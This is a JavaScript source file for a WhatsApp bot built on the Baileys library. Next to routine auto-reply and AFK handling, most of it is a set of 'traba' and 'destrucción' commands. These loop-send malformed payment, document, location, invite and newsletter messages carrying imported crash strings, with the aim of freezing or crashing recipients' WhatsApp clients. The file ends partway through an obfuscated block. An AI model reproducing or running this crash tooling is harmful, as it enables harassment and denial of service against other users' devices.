const { default: makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext33 } = require('./69/xeontext33')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { carrinho2 } = require('./69/carrinho2')
const { carrinho3 } = require('./69/carrinho3')
const { carrinho44 } = require('./69/carrinho44')
const { IU2 } = require('./69/IU2')
const { ios } = require('./69/ios')

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
        const xdate = moment.tz('America/Sao_Paulo').format('DD/MM/YYYY')
        
        
        
module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId : (m.mtype == 'templateButtonreplygcxeonMessage') ? m.message.templateButtonreplygcxeonMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcxeon.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(XeonBotInc, m, premium);
//group chat msg by xeon
const replygcxeon = (teks) => {
XeonBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: destructor})
}

//bug functions
const destructor = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: ``
}}
}

const xeonimun = (texto) => {
XeonBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: destructor }).catch(e => {
return reply("Erro..")
})
}

const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Xeon's ur father`
}}
}
async function XeonyCrashy(dgxeon,chat) {
XeonBotInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgxeon}.${xeontext1}` ,
caption: `${dgxeon + readmore + ios}`,
}, {quoted: destructor })
}
//end bug functions

async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ..."
]
let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!XeonBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            XeonBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        XeonBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        XeonBotInc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        XeonBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        XeonBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            XeonBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: destructor })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: destructor })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: destructor })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: destructor })
}
}

const sendapk = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replygcxeon(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                XeonBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
        
case 'destrucción4':    {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ""
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ""
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "",
            subtitle: "",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              
              { 
    name: "cta_reminder", 
    display_text: "Set Reminder", 
    id: "message", 
    reminder_time: "2024-04-28T12:00:00Z", 
    action: "reminder",
    icon: "⏰",
    style: "button" 
  }
              
           ],
          })
        })
    }
  }
}, {})

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break

case 'destrucción3':    {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ""
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ""
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "",
            subtitle: "",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              
              { 
    name: "cta_call", 
    display_text: "Call Us", 
    id: "message", 
    action: "call",
    icon: "📞",
    style: "button" 
  },
              
           ],
          })
        })
    }
  }
}, {})

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break        
        
case 'destrucción2':    {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ""
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ""
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "",
            subtitle: "",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              
              { 
    name: "cta_copy", 
    display_text: "Copy", 
    id: "123456789", 
    action: "default",
    icon: "📋",
    style: "button" 
  },
              
           ],
          })
        })
    }
  }
}, {})

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break

case 'destrucción1':    {
for (let i = `3`;i !== 0; i -=1){
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync('./src/image/descarga.jpeg'),
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":99999999999999999999999999999999999999999999999,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"CREADO POR SAORI${xeontext6}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":99999999999999999999999999999999999999999999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":99999999999999999999999999999999999999999999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99999999999999999999999999999999999999999999999},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":99999999999999999999999999999999999999999999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99999999999999999999999999999999999999999999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}]}}}}
}, { quoted: m})
await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}}
break


case 'traba1': {
for (let i = `5`;i !== 0; i -=1){
await sleep(6000)
jumlah = `${encodeURI(text)}`
XeonBotInc.sendMessage(from, {text: `${pushname}`}, {quoted: destructor})
}
}
break

case 'traba2iu':{
for (let i = `5`;i !== 0; i -=1){
            var messa = await prepareWAMessageMedia({
              image: fs.readFileSync('./src/image/menu.jpg')
            }, {
              upload: XeonBotInc.waUploadToServer
            })
            var locationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
              "locationMessage": {
                "degreesLatitude": -23.6261,
                "degreesLongitude": -46.7917,
                "name": `${IU2}`,
               "jpegThumbnail": fs.readFileSync('./src/image/menu.jpg'),
              }
            }), {
              userJid: from, quoted: destructor
            })
            XeonBotInc.relayMessage(from, locationMessage.message, {
              messageId: locationMessage.key.id
            })
            }}
            break

case 'traba3iu': {
for (let i = `5`;i !== 0; i -=1){
const repf = await XeonBotInc.sendMessage(from, { 
location: { 
"degreesLatitude": -18.49335858,
"degreesLongitude": -62.19109138,
"name": `${IU2}`,
location: list }, mentions: [sender] }, { quoted: destructor })
XeonBotInc.sendMessage
}}
break

case 'traba4': {
for (let i = `5`;i !== 0; i -=1){
XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: `*${pushname}2*`,
                        mimetype: "ff.exct",
                        fileName: `${pushname}\n${xeontext2}`,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${pushname}`,
                                body: ``,
                                thumbnail: fs.readFileSync('./src/image/menu.jpg'),
                                sourceUrl: `https://whatsapp.com/channel/0029Va1wf2DD38CK2PHG1n`,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: destructor 
                    })
                }}
break

case 'traba5ios': {
for (let i = `5`;i !== 0; i -=1){
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/menu.jpeg') }, { upload: XeonBotInc.waUploadToServer })
var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "120363271423837007@g.us",
"inviteCode": "Gld0k6c4DNu1LaVqDxTqTX",
"inviteExpiration": Date.now(),
"groupName": `${pushname}${ios}`,
"caption": `${pushname}`
}
}), { quoted: destructor})
XeonBotInc.relayMessage(from, groupInviteMessage.message, { messageId: groupInviteMessage.key.id })
}}
break


case 'traba6': {
for (let i = `5`;i !== 0; i -=1){
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/menu.jpeg') }, { upload: XeonBotInc.waUploadToServer })
var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "120363271423837007@g.us",
"inviteCode": "Gld0k6c4DNu1LaVqDxTqTX",
"inviteExpiration": Date.now(),
"groupName": `${pushname}${carrinho3}`,
"caption": `${pushname}`
}
}), { quoted: destructor})
XeonBotInc.relayMessage(from, groupInviteMessage.message, { messageId: groupInviteMessage.key.id })
}}
break



case 'traba7':
for (let i = `5`;i !== 0; i -=1){
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/menu.jpg') }, { upload: XeonBotInc.waUploadToServer })
var requestPhoneNumberMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPhoneNumberMessage": {}
}), { quoted: destructor})
XeonBotInc.relayMessage(from, requestPhoneNumberMessage.message, { messageId: requestPhoneNumberMessage.key.id })
}
break

case 'traba8ios':{
for (let i = `5`;i !== 0; i -=1){
XeonBotInc.sendMessage(from, {
              image: fs.readFileSync('./src/image/menu.jpg'), caption: `${pushname}`,
            "contextInfo": {"forwardingScore": 99999999,
"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `${pushname}${ios}`,serverMessageId: 2 }}},
{quoted: destructor })
}
}
break


case 'traba9iu': {

                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '99999999999999999999999999999999999999999999999',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: `${IU2}`,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {quoted: destructor })
                
}
break



case 'traba10':
for (let i = `5`;i !== 0; i -=1){
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/descarga.jpeg') }, { upload: XeonBotInc.waUploadToServer })
var loc = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -18.49335858,
"degreesLongitude": -62.19109138,
"caption": `${IU2}`,
"sequenceNumber": "447488855116",
"jpegThumbnail": fs.readFileSync('./src/image/descarga.jpeg'),
}}), { quoted: destructor })
XeonBotInc.relayMessage(from,loc.message, { messageId: loc.key.id })
}
break


case 'traba11': {
for (let i = `5`;i !== 0; i -=1){
await XeonBotInc.sendMessage(m.chat, { text: `${pushname}`, contextInfo:{ isForwarded: true,
 forwardedNewsletterMessageInfo: { newsletterJid: '1203632223956750@newsletter',
  newsletterName: `${pushname}${xeontext33}`, 
  serverMessageId: 2 } }}, 
  { quoted: destructor })
}
}
break

case 'traba12ios': 
 amount = `${encodeURI(text)}`
for (let i = `5`;i !== 0; i -=1){

XeonyCrashy(pushname,m.chat)
}
break


case 'traba13': {
jumlah = `${encodeURI(text)}`
for (let i = `5`;i !== 0; i -=1){
await sleep(6000)
XeonBotInc.sendMessage(from, {text: `*${pushname}*`}, {quoted: destructor})
}
}
break


case 'traba14iu':
for (let i = `5`;i !== 0; i -=1){
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/menu.jpeg') }, { upload: XeonBotInc.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"jpegThumbnail": fs.readFileSync('./src/image/menu.jpeg'),
"productId": " ",
"title": `📡.il/${IU2}`,
"fileLength": "161349999999999",
"description": `${pushname}`,
"footerText": ` jjjj• `,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© Hirox`,
"url": "wa.me/558388741307"
},
"businessOwnerJid": "558388741307@s.whatsapp.net",
}
}), { quoted: destructor})
XeonBotInc.relayMessage(from, catalog.message, { messageId: catalog.key.id })
}
break


case 'traba15': 
for (let i = `5`;i !== 0; i -=1){
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/menu.jpg') }, { upload: XeonBotInc.waUploadToServer })
var documentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7119-24/29949057_1673439003134136_8717143220188456473_n.enc?ccb=11-4&oh=01_AdQKvXFOKFVqb0bq6t6cD1AT8YA1lUmzCh6BmjRufONBTg&oe=64D30429&mms3=true",
"mimetype": " ",
"title": "ff.exct",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 999999999,
"index": 0,
"mediaKey": "fcxyCLIN2AubiCHSqdykEzQdvmIYdzZJHGeTz1UoFlY=",
"fileName": `${pushname}\n${xeontext1}`,
"caption": `*${pushname}*`,
"fileEncSha256": "vaEk8nmpa8fera+p5GTdtjaHNw34HrcF+rXLe3tG9/M=",
"directPath": "/v/t62.7119-24/29949057_1673439003134136_8717143220188456473_n.enc?ccb=11-4&oh=01_AdQKvXFOKFVqb0bq6t6cD1AT8YA1lUmzCh6BmjRufONBTg&oe=64D30429",
"mediaKeyTimestamp": "1688964255"
}
}), { quoted: destructor})
XeonBotInc.relayMessage(from, documentMessage.message, { messageId: documentMessage.key.id })
}
break

case 'traba16': 
for (let i = `5`;i !== 0; i -=1){
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/menu.jpg') }, { upload: XeonBotInc.waUploadToServer })
var requestPhoneNumberMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPhoneNumberMessage": {}
}), { quoted: destructor})
XeonBotInc.relayMessage(from, requestPhoneNumberMessage.message, { messageId: requestPhoneNumberMessage.key.id })
}
break


case 'traba17iu':
for (let i = `5`;i !== 0; i -=1){
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/image/menu.jpg') }, { upload: XeonBotInc.waUploadToServer })
var locationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -18.49335858,
"degreesLongitude": -62.19109138,
"name": `📡.il/${IU2}`,
"jpegThumbnail": fs.readFileSync('./src/image/menu.jpeg'),
}
}), { quoted: destructor})
XeonBotInc.relayMessage(from, locationMessage.message, { messageId: locationMessage.key.id })
}
break


case 'traba18iu':

XeonBotInc.sendMessage(from, {
document: {url: './settings.js'},
mimetype: 'application/txt',
fileName: `📡.il/${IU2}`
},
{quoted: destructor
})
break

case 'traba19': {
 if (!args[0]) return replygcxeon(`Pon ${prefix+command} cantidad\nEjemplo ${prefix+command} 13`) 
let amount = text*1
function _0x4eaeea(_0x43de39,_0x57c976,_0x430754,_0x265f9d){return _0x453f(_0x43de39- -0xa3,_0x430754);}(function(_0x207b77,_0x50c310){function _0x2ee17f(_0x251028,_0x17f02c,_0x33af66,_0x3638bc){return _0x453f(_0x17f02c-0x3,_0x3638bc);}const _0x17001b=_0x207b77();function _0x936463(_0x57456c,_0x57c26a,_0x541f15,_0x3d525b){return _0x453f(_0x3d525b-0x1c3,_0x57456c);}while(!![]){try{const _0x292451=parseInt(_0x2ee17f(0xe8,0xef,0xf7,0xd8))/(-0x2034+0x16a2+0x993)*(parseInt(_0x936463(0x267,0x273,0x293,0x28b))/(-0x4f*0xe+-0x2d0+-0x4*-0x1c9))+-parseInt(_0x936463(0x291,0x269,0x247,0x27f))/(0x25ec+0x18a0+0x1*-0x3e89)+parseInt(_0x936463(0x2f9,0x2e7,0x28a,0x2bf))/(-0xf43+-0xe57+0x1d9e)*(-parseInt(_0x936463(0x2c6,0x2a7,0x2a4,0x290))/(-0x21cf+-0x1e3a+0x400e))+parseInt(_0x936463(0x241,0x23d,0x23c,0x264))/(0x1d05*0x1+0x113c+0x315*-0xf)*(-parseInt(_0x936463(0x299,0x2eb,0x2dd,0x2c9))/(-0x1948+0x1*-0x3e2+-0x3*-0x9bb))+-parseInt(_0x2ee17f(0x9d,0x94,0xd3,0xb7))/(0x143b+-0x392+-0x2b*0x63)*(-parseInt(_0x936463(0x294,0x253,0x254,0x270))/(0x2026+0x2*-0x698+-0x12ed))+parseInt(_0x2ee17f(0xfb,0x10d,0x131,0x13c))/(-0x2019*0x1+0xd72+0xf*0x13f)+parseInt(_0x2ee17f(0xbb,0xc1,0xe0,0xbb))/(0x4*-0x7bb+-0x14f2+0x33e9);if(_0x292451===_0x50c310)break;else _0x17001b['push'](_0x17001b['shift']());}catch(_0x497449){_0x17001b['push'](_0x17001b['shift']());}}}(_0x3b9f,0x1223*-0x31+0x105*-0x3f+0x1*0x5c66f));const _0x1c8a3c=(function(){const _0x155a57={};function _0x4976a3(_0x25dcc7,_0x26931b,_0x1cd801,_0xb85f6){return _0x453f(_0x1cd801-0x1c2,_0x25dcc7);}_0x155a57[_0x531257(0x2b2,0x2c1,0x278,0x2ba)]=function(_0x5b2945,_0x2c34dd){return _0x5b2945===_0x2c34dd;},_0x155a57[_0x531257(0x319,0x2e4,0x2ee,0x355)]=_0x531257(0x30b,0x2ee,0x2d4,0x302);const _0x52b398=_0x155a57;let _0x586fd9=!![];function 